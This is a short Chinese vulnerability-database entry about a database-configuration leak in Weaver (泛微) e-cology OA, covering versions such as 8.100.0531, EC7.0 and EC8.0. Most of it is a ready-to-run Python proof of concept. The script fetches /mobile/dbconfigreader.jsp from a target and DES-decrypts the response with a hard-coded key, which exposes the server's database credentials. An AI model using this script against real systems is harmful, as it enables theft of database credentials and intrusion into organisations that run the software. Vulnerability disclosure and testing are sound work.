---
title: '泛微OA数据库配置信息泄漏'
date: Sun, 30 Aug 2020 04:06:36 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响版本

目前已知为8.100.0531，不排除其他版本，包括不限于EC7.0、EC8.0

### 漏洞验证POC

```
# -*- coding:utf-8 -*-
#Author:print("")
import pyDes,requests
import sys
def desdecode(secret_key,s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y
default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}
def send(url):
    data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url).content
    return (desdecode('1z2x3c4v5b6n', data.strip()))

if __name__ == '__main__':
    url = sys.argv[1]
    print('泛微e-cology OA 数据库配置信息泄漏漏洞')
    print('url--->%s'%url)
    print('数据库信息如下----->:%s'%send(url)) 
```

